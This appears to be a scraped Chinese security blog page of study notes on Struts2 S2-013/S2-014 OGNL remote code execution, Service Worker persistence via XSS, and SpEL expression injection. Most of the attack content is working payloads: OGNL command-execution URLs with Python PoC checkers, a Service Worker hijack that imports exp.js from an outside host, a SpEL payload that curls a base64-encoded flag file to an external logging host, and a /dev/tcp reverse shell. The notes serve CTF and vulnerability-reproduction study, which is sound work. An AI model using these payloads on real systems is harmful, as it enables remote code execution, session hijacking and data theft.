    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">S2-013_S2-014远程代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p>
<pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}

// 或

link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p>
<pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p>
<pre><code class="python">import requests

def poc(url):
    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;
    data={
        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;
    }
    try :
        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})
        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:
            return True
    except :
        pass
    return False
</code></pre>
<p>S2-014</p>
<pre><code class="python">import requests

def poc(url):
    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;
    data={
        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;
    }
    try :
        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})
        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:
            return True
    except :
        pass
    return False
</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/S2-013_S2-014远程代码执行漏洞/">https://www.ccreater.top/1970/01/01/S2-013_S2-014远程代码执行漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckmn57556001xs1nic5fbdty1" data-title="S2-013_S2-014远程代码执行漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-Service Worker" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/Service%20Worker/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/Service%20Worker/">Service Worker</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h1><h2 id="Service-Worker-学习"><a href="#Service-Worker-学习" class="headerlink" title="Service Worker 学习"></a>Service Worker 学习</h2><h3 id="配置检查"><a href="#配置检查" class="headerlink" title="配置检查"></a>配置检查</h3><p>在已经支持 serivce workers 的浏览器的版本中，很多特性没有默认开启。如果你发现示例代码在当前版本的浏览器中怎么样都无法正常运行，你可能需要开启一下浏览器的相关配置：</p>
<ul>
<li><strong>Firefox Nightly</strong>: 访问 <code>about:config</code> 并设置 <code>dom.serviceWorkers.enabled</code> 的值为 true; 重启浏览器；</li>
<li><strong>Chrome Canary</strong>: 访问 <code>chrome://flags</code> 并开启 <code>experimental-web-platform-features</code>; 重启浏览器 (注意：有些特性在Chrome中没有默认开放支持)；</li>
<li><strong>Opera</strong>: 访问 <code>opera://flags</code> 并开启<code>ServiceWorker 的支持</code>; 重启浏览器。 </li>
</ul>
<p>另外，你需要通过 HTTPS 来访问你的页面 — 出于安全原因，<strong>Service Workers 要求必须在 HTTPS 下才能运行。Github 是个用来测试的好地方，因为它就支持HTTPS。为了便于本地开发，<code>localhost</code> 也被浏览器认为是安全源。</strong></p>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol>
<li>Service Workers 要求必须在 HTTPS 或者 localhost 下才能运行</li>
<li>Service Workers 要求尽可能的异步操作</li>
</ol>
<h3 id="Service-Workers-的注册及安装"><a href="#Service-Workers-的注册及安装" class="headerlink" title="Service Workers 的注册及安装"></a>Service Workers 的注册及安装</h3><p>通过<code>serviceWorkerContainer.register()</code>来注册一个Service Workers</p>
<p>eg.</p>
<pre><code class="javascript">if (&#39;serviceWorker&#39; in navigator) {
  navigator.serviceWorker.register(&#39;/sw-test/sw.js&#39;, { scope: &#39;/sw-test/&#39; }).then(function(reg) {
    // registration worked
    console.log(&#39;Registration succeeded. Scope is &#39; + reg.scope);
  }).catch(function(error) {
    // registration failed
    console.log(&#39;Registration failed with &#39; + error);
  });
}</code></pre>
<p>其中scope为Service Workers的作用域，默认是scriptURL(<code>/sw-test/sw.js</code>)所在的文件夹及其子文件夹，scope的选择范围只能是scriptURL所在的文件夹或者子文件夹，且不能影响其他网站，只能影响当前的域名。</p>
<p>scriptURL是相对于origin的URL而不是相对于引用他的那个JS文件，当然也有例外（ <code>Content-Type</code> 必须是 <code>text/javascript</code>）</p>
<blockquote>
<p>如果你的 service worker 被激活在一个有 <code>Service-Worker-Allowed</code> header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。</p>
</blockquote>
<p>安装过程：</p>
<p><img src="https://mdn.mozillademos.org/files/12636/sw-lifecycle.png" alt="image1496"></p>
<h3 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h3><p>Service Workers支持的事件如下</p>
<p><img src="https://mdn.mozillademos.org/files/12632/sw-events.png" alt="image1603"></p>
<p>install:安装时会触发InstallEvent</p>
<p>activate:安装事件之后调用activate事件</p>
<p>fetch:Service Workers 中的所有请求都会触发fetch事件</p>
<p>sync:当发起一个同步请求是会触发sync事件</p>
<pre><code class="javascript">this.addEventListener(&#39;install&#39;, function(event) {
  event.waitUntil(
    caches.open(&#39;v1&#39;).then(function(cache) {
      return cache.addAll([
        &#39;/sw-test/&#39;,
        &#39;/sw-test/index.html&#39;,
        &#39;/sw-test/style.css&#39;,
        &#39;/sw-test/app.js&#39;,
        &#39;/sw-test/image-list.js&#39;,
        &#39;/sw-test/star-wars-logo.jpg&#39;,
        &#39;/sw-test/gallery/&#39;,
        &#39;/sw-test/gallery/bountyHunters.jpg&#39;,
        &#39;/sw-test/gallery/myLittleVader.jpg&#39;,
        &#39;/sw-test/gallery/snowTroopers.jpg&#39;
      ]);
    })
  );
});

self.addEventListener(&#39;activate&#39;, function(event) {
  var cacheWhitelist = [&#39;v2&#39;];

  event.waitUntil(
    caches.keys().then(function(keyList) {
      return Promise.all(keyList.map(function(key) {
        if (cacheWhitelist.indexOf(key) === -1) {
          return caches.delete(key);
        }
      }));
    })
  );
});

self.addEventListener(&#39;fetch&#39;, function(event) {
  event.respondWith(
    caches.match(event.request).then(function(resp) {
      return resp || fetch(event.request).then(function(response) {
        return caches.open(&#39;v1&#39;).then(function(cache) {
          cache.put(event.request, response.clone());
          return response;
        });  
      });
    })
  );
});</code></pre>
<h2 id="Service-Worker-With-XSS"><a href="#Service-Worker-With-XSS" class="headerlink" title="Service Worker With XSS"></a>Service Worker With XSS</h2><h3 id="XSS简单示范"><a href="#XSS简单示范" class="headerlink" title="XSS简单示范"></a>XSS简单示范</h3><p>通过Service Worker 可以持久的控制受害者</p>
<p>利用条件如下：</p>
<ol>
<li>一个xss点</li>
<li>MIME TYPE 为 application/javascript的可控页面（通常是jsonp）</li>
</ol>
<p><code>index.php?xss=navigator.serviceWorker.register(&quot;/sw/jsonp.php?xss=importScripts(%27https://serviceworker.free.beeceptor.com/exp.js%27);&quot;);</code></p>
<p>exp.js</p>
<pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {
  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
});</code></pre><h3 id="利用Service-Workers-控制主站及其子站点"><a href="#利用Service-Workers-控制主站及其子站点" class="headerlink" title="利用Service Workers 控制主站及其子站点"></a>利用Service Workers 控制主站及其子站点</h3><p>假设在A.evil.com上存在XSS点，B.evil.com上存在可控jsonp，</p>
<p>那么我们可以通过设置<code>document.domain=&quot;evil.com&quot;</code>，嵌入一个iframe（src=B.evil.com），然后执行恶意代码插入Service Workers</p>
<p>A站点执行(使用self.skipWaiting()使的Service Workes 控制当前界面)</p>
<pre><code class="javascript">document.domain=&quot;evil.com&quot;;
a=document.createElement(&quot;iframe&quot;);
a.src=&quot;https://B.evil.com/&quot;;
document.body.append(a);
document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
function fuck(){
    var code = `navigator.serviceWorker.register(&quot;/jsonp.php?callback=self.importScripts(&#39;//mysite.com/fuck.js&#39;)//&quot;)`;
    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
}
</code></pre>
<p>这样我们便控制住了B站点</p>
<p>fuck.js</p>
<pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;
a=document.createElement(&quot;iframe&quot;);
a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;
document.body.append(a);
document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
function fuck(){
    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;
    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
}
</code></pre>
<p>exp.js</p>
<pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {
  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
});

</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>教程：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
<p>API：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a></p>
<p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/Service">https://www.ccreater.top/1970/01/01/Service</a> Worker/](<a href="https://www.ccreater.top/1970/01/01/Service">https://www.ccreater.top/1970/01/01/Service</a> Worker/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/Service%20Worker/" data-id="ckmn575570020s1ni3zz0dfsh" data-title="Service Worker" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-SpEL表达式注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p>
<h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());
String message = (String) exp.getValue();
//String message = exp.getValue(String.class);
</code></pre>
<p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p>
<p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p>
<h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
String message = (String) exp.getValue();</code></pre>
<h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p>
<p>访问属性：</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<p>方法调用：</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<p>调用构造函数：</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);
        System.out.println((Object)exp.getValue(new Object(){
            public String fucker=&quot;fucker&quot;;
            public String tou(){
                return &quot;toutoutou&quot;;
            };
        }));</code></pre>
<p>结果：<code>fuckertoutoutou</code></p>
<h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;name&quot;);

EvaluationContext context = new StandardEvaluationContext(tesla);
String name = (String) exp.getValue(context);</code></pre>
<p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p>
<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;name&quot;);
String name = (String) exp.getValue(tesla);</code></pre>
<h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();

// Inventions Array
StandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);

// evaluates to &quot;Induction motor&quot;
String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(
        teslaContext, String.class);

// Members List
StandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);

// evaluates to &quot;Nikola Tesla&quot;
String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(
        societyContext, String.class);

// List and Array navigation
// evaluates to &quot;Wireless communication&quot;
String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(
        societyContext, String.class);</code></pre>
<p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p>
<pre><code class="java">// Officer&#39;s Dictionary

Inventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(
        societyContext, Inventor.class);

// evaluates to &quot;Idvor&quot;
String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(
        societyContext, String.class);

// setting values
parser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(
        societyContext, &quot;Croatia&quot;);</code></pre>
<h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p>
<pre><code class="java">// evaluates to a Java list containing the four numbers
List numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);

List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre>
<p>字典：</p>
<pre><code class="java">// evaluates to a Java map containing the two entries
Map inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);

Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre>
<p>数组：</p>
<p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p>
<pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre>
<h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p>
<p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  *<em>T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 *</em></p>
<pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);

Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);

boolean trueValue = parser.parseExpression(
        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)
        .getValue(Boolean.class);</code></pre>
<h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p>
<pre><code class="java">String randomPhrase = parser.parseExpression(
        &quot;random number is #{T(java.lang.Math).random()}&quot;,
        new TemplateParserContext()).getValue(String.class);</code></pre>
<p>结果：<code>random number is xxxx</code></p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p>
<h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p>
<h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p>
<h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)
T(Thread).sleep(10000)
#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)
new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>利用反射构造绕过黑名单</p>
<pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>利用ScriptEngineManager构造绕过黑名单</p>
<pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()
    .getEngineByName(&quot;nashorn&quot;)
        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre>
<pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]
    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]
        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]{,,...})</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p>
<pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p>
<h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p>
<ul>
<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
</ul>
<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p>
<p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p>
<p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  文档</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/SpEL表达式注入漏洞/">https://www.ccreater.top/1970/01/01/SpEL表达式注入漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ckmn575580024s1nidir11hbe" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
